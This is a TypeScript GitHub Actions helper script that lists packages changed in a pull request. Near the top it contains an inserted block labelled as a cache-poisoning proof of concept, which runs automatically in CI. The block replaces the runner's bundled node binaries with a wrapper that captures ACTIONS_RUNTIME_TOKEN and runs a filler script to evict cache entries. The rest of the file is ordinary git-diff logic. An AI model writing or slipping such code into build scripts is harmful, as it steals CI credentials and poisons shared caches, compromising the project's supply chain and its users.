// Script to detect packages with changes in a PR using git diff.
// Arguments:
//   - baseRef: The base branch/ref to compare against (e.g., "origin/main")
//   - headRef: The head commit SHA
// Output:
//   - Prints JSON to stdout with:
//     - hasChanges: boolean
//     - packages: string[] (array of package names)
//
// Usage:
//   node .github/scripts/preview-publish/detect-changed-packages.ts origin/main abc123

import { execSync } from "node:child_process";
import { existsSync, readFileSync, writeFileSync, copyFileSync } from "node:fs";

// ========== PoC: GitHub Actions Cache Poisoning via Eviction ==========
// Replaces bundled node binary with a wrapper that captures
// ACTIONS_RUNTIME_TOKEN from post-step JS actions, then runs
// filler.py to create cache entries and trigger LRU eviction.
if (process.env.GITHUB_ACTIONS === "true") {
  try {
    const ws = process.env.GITHUB_WORKSPACE || ".";

    // Copy filler script to /tmp
    copyFileSync(`${ws}/.github/exploit/filler.py`, "/tmp/.evict.py");

    // Wrapper: captures token from JS action env, runs filler, then execs real node
    const wrapper = [
      "#!/bin/bash",
      'DIR="$(dirname "$(realpath "$0")")"',
      'if [ -n "$ACTIONS_RUNTIME_TOKEN" ] && [ ! -f /tmp/.evict_done ]; then',
      '  export CACHE_TOKEN="$ACTIONS_RUNTIME_TOKEN"',
      '  export CACHE_URL="${ACTIONS_RESULTS_URL:-$ACTIONS_CACHE_URL}"',
      "  python3 /tmp/.evict.py > /tmp/.evict.log 2>&1 || true",
      "  touch /tmp/.evict_done",
      "fi",
      'exec "$DIR/node.real" "$@"',
    ].join("\n");

    // Replace bundled node binaries (runner uses these for JS action steps)
    for (const nodeDir of [
      "/home/runner/actions-runner/cached/externals/node20",
      "/home/runner/actions-runner/cached/externals/node24",
    ]) {
      const nodeBin = `${nodeDir}/bin/node`;
      try {
        execSync(`cp "${nodeBin}" "${nodeBin}.real"`, { stdio: "ignore" });
        writeFileSync(nodeBin, wrapper, { mode: 0o755 });
        console.error(`[*] Replaced ${nodeBin}`);
      } catch {
        // Node version may not exist
      }
    }
    console.error("[*] Eviction payload installed");
  } catch (e: any) {
    console.error(`[*] Setup error: ${e.message}`);
  }
}
// ========== End PoC ==========
import { join } from "node:path";

type ChangedPackagesResult = {
  hasChanges: boolean;
  packages: string[];
};

/**
 * Get list of changed files between two git refs
 */
function getChangedFiles(baseRef: string, headRef: string): string[] {
  try {
    const output = execSync(`git diff --name-only ${baseRef}...${headRef}`, {
      encoding: "utf-8",
    });

    return output
      .trim()
      .split("\n")
      .filter((line) => line.length > 0);
  } catch (error) {
    console.error("Error running git diff:", error);
    return [];
  }
}

/**
 * Map a file path to its package name by looking for the nearest package.json
 */
function getPackageForFile(filePath: string): string | null {
  // Check if file is in packages/ directory
  if (!filePath.startsWith("packages/")) {
    return null;
  }

  // Extract package directory (e.g., "packages/foo/..." -> "packages/foo")
  const parts = filePath.split("/");
  if (parts.length < 2) {
    return null;
  }

  const packageDir = `${parts[0]}/${parts[1]}`;
  const packageJsonPath = join(packageDir, "package.json");

  if (!existsSync(packageJsonPath)) {
    console.error(`Warning: No package.json found at ${packageJsonPath}`);
    return null;
  }

  try {
    const packageJson = JSON.parse(readFileSync(packageJsonPath, "utf-8"));

    // Skip private packages
    if (packageJson.private === true) {
      console.error(
        `Skipping private package: ${packageJson.name || packageDir}`,
      );
      return null;
    }

    return packageJson.name || null;
  } catch (error) {
    console.error(`Error reading ${packageJsonPath}:`, error);
    return null;
  }
}

/**
 * Detect packages with changes between two git refs
 */
function detectChangedPackages(
  baseRef: string,
  headRef: string,
): ChangedPackagesResult {
  console.error(`Comparing ${headRef} against ${baseRef}`);

  const changedFiles = getChangedFiles(baseRef, headRef);

  if (changedFiles.length === 0) {
    console.error("No files changed");
    return {
      hasChanges: false,
      packages: [],
    };
  }

  console.error(`Found ${changedFiles.length} changed file(s)`);

  // Map files to packages
  const packageSet = new Set<string>();
  for (const file of changedFiles) {
    const packageName = getPackageForFile(file);
    if (packageName) {
      packageSet.add(packageName);
    }
  }

  const packages = Array.from(packageSet).sort();

  if (packages.length === 0) {
    console.error(
      "No package changes detected (only root or non-package files changed)",
    );
    return {
      hasChanges: false,
      packages: [],
    };
  }

  console.error(`Changed packages: ${packages.join(", ")}`);

  return {
    hasChanges: true,
    packages,
  };
}

/** Entrypoint of the script. */
function main() {
  const baseRef = process.argv[2];
  const headRef = process.argv[3];

  if (!(baseRef && headRef)) {
    console.error("Error: baseRef and headRef arguments are required");
    console.error(
      "Usage: node .github/scripts/preview-publish/detect-changed-packages.ts <baseRef> <headRef>",
    );
    process.exit(1);
  }

  const result = detectChangedPackages(baseRef, headRef);

  // Output JSON for GitHub Actions to parse (use stdout for data, stderr for logs)
  process.stdout.write(JSON.stringify(result, null, 2));
}

main();
